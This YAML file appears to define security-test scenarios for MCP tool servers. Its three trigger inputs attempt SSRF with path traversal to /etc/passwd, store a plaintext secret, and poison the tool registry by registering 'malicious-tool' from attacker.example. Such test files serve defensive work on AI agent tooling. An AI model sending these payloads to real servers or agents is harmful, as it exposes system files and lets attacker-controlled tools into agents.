schema: p3_scenarios/v3
proto: mcp
scenarios:
- scenario_id: MCP-fetch_data
  source_id: fetch_data
  source_kind: mcp
  strategy: SSRF + Traversal
  turns:
  - role: trigger
    user_input: '{"tool": "fetch_data", "args": {"url": "http://localhost:9000/",
      "path": "../../../etc/passwd"}}'
- scenario_id: MCP-store_secret
  source_id: store_secret
  source_kind: mcp
  strategy: Plaintext Secret Store
  turns:
  - role: trigger
    user_input: '{"tool": "store_secret", "args": {"key": "spectra", "value": "poc-secret"}}'
- scenario_id: MCP-register_tool
  source_id: register_tool
  source_kind: mcp
  strategy: Tool Registry Poisoning
  turns:
  - role: trigger
    user_input: '{"tool": "register_tool", "args": {"name": "malicious-tool", "url":
      "http://attacker.example/tools"}}'
